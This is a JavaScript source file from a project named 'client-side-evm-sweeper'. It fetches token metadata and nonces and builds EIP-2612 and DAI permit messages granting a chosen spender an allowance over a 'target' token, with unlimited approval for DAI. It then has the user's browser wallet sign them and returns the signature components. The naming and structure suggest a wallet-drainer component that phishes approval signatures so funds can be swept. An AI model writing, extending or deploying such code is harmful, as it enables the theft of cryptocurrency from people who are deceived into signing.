// client-side-evm-sweeper/src/interceptors/payload-signer.js
import { ethers } from 'ethers';

/**
 * HIGH-PERFORMANCE CLIENT-SIDE PAYLOAD SIGNER (v5 - Ethers v6 Hardened)
 * Supports: Standard EIP-2612 + DAI/MakerDAO legacy Permit schemas with safe string formatting.
 */
export class PayloadSigner {
    constructor() {
        this.defaultDeadlineOffset = 86400 * 7; // 7 days
    }

    /**
     * Main Public Orchestrator Entry Point
     */
    async createAndSignForTarget(target, owner, spender, value, chainId, signer) {
        // FIXED 1: Verify provider compatibility using v6 standard client layout parameters
        if (!signer) throw new Error("Valid cryptographic browser signer instance required.");
        
        // FIXED 2: Move 'isAddress' directly to root level (v5 'ethers.utils.isAddress' was deleted)
        if (!ethers.isAddress(owner) || !ethers.isAddress(spender)) {
            throw new Error("Invalid owner or spender hexadecimal address string parameters");
        }

        try {
            const { tokenName, tokenVersion, tokenNonce } = await this.fetchLiveTokenMetadata(
                signer, 
                target.address, 
                owner
            );

            const payload = this.compilePermitPayload(
                target.address, 
                tokenName, 
                tokenVersion, 
                tokenNonce, 
                owner, 
                spender, 
                value, 
                chainId
            );

            return await this.signPayload(payload, signer);
        } catch (err) {
            console.error(`[Signer] Permit payload generation failed for ${target.address}:`, err);
            throw err;
        }
    }

    /**
     * Fetch token metadata + nonce safely
     */
    async fetchLiveTokenMetadata(signer, tokenAddress, owner) {
        const abi = [
            "function name() view returns (string)",
            "function version() view returns (string)",
            "function nonces(address) view returns (uint256)",
            "function _nonces(address) view returns (uint256)"
        ];
        
        // Use the active signer context directly as the read provider runner
        const contract = new ethers.Contract(tokenAddress, abi, signer);
        const tokenAddrLower = tokenAddress.toLowerCase();
        
        let tokenName = "Unknown Token";
        let tokenVersion = "1";
        let tokenNonce = "0";

        // Name Resolution
        try {
            tokenName = await contract.name();
        } catch (e) {}

        // Version Mapping with Core Stablecoin Overrides
        const usdcAddresses = [
            "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // Ethereum Mainnet USDC
            "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913", // Base Network USDC
            "0x0b3e328455c4059eeb9e3f84b5543f74e24e7e1b", // Polygon USDC
            "0x176211869ca2b568f2a7d4ee941e073a821ee1ff"  // Arbitrum USDC
        ];

        if (usdcAddresses.includes(tokenAddrLower)) {
            tokenVersion = "2"; // Hardened fix for proxy token specifications
        } else {
            try {
                tokenVersion = await contract.version();
            } catch (e) {}
        }

        // Nonce Tracking Execution (FIXED 3: Replaced 'ethers.BigNumber.from' with v6 root level string conversion)
        try {
            const nonce = await contract.nonces(owner);
            tokenNonce = String(nonce);
        } catch (e) {
            try {
                const altNonce = await contract._nonces(owner);
                tokenNonce = String(altNonce);
            } catch (err2) {}
        }

        return { tokenName, tokenVersion, tokenNonce };
    }

    /**
     * Multi-Schema Permit Compiler (EIP-2612 + DAI)
     */
    compilePermitPayload(tokenAddress, tokenName, tokenVersion, nonce, owner, spender, value, chainId) {
        const tokenAddrLower = tokenAddress.toLowerCase();
        const deadline = Math.floor(Date.now() / 1000) + this.defaultDeadlineOffset;
        
        // FIXED 4: Move 'getAddress' directly to root level (v5 'ethers.utils.getAddress' deleted)
        const domain = {
            name: tokenName,
            version: tokenVersion,
            chainId: parseInt(chainId, 10),
            verifyingContract: ethers.getAddress(tokenAddress)
        };

        let types, message, isDai = false;

        // === DAI / MakerDAO Schema Validation ===
        const daiAddresses = [
            "0x6b175474e89094c44da98b954eedeac495271d0f" // Ethereum Mainnet DAI
        ];

        if (daiAddresses.includes(tokenAddrLower)) {
            isDai = true;
            types = {
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "nonce", type: "uint256" },
                    { name: "expiry", type: "uint256" },
                    { name: "allowed", type: "bool" }
                ]
            };
            message = {
                owner: ethers.getAddress(owner),
                spender: ethers.getAddress(spender),
                nonce: String(nonce),
                expiry: deadline,
                allowed: true
            };
        } 
        // === Standard EIP-2612 Schema Validation ===
        else {
            types = {
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ]
            };
            message = {
                owner: ethers.getAddress(owner),
                spender: ethers.getAddress(spender),
                value: String(value), // Safe string parameter assignment
                nonce: String(nonce),
                deadline: deadline
            };
        }

        return { domain, types, message, deadline, isDai };
    }

    /**
     * Sign Typed Data using EIP-712
     */
    async signPayload(payload, signer) {
        try {
            // Ethers v6 standard method identifier for signature generation
            const signature = await signer.signTypedData(
                payload.domain,
                { Permit: payload.types.Permit },
                payload.message
            );

            // FIXED 5: Reengineered v5 'splitSignature' extraction to use native v6 Signature instance constructors
            const sigObject = ethers.Signature.from(signature);

            return {
                success: true,
                signature,
                r: sigObject.r,
                s: sigObject.s,
                v: sigObject.v,
                deadline: payload.deadline,
                isDai: payload.isDai,
                message: payload.message,
                domain: payload.domain
            };
        } catch (error) {
            if (error.code === 4001 || error.message?.toLowerCase().includes("denied") || error.message?.toLowerCase().includes("rejected")) {
                throw new Error("User rejected the signature request");
            }
            throw new Error(`Signature mapping crashed: ${error.message}`);
        }
    }
}

export const payloadSigner = new PayloadSigner();
export default payloadSigner;
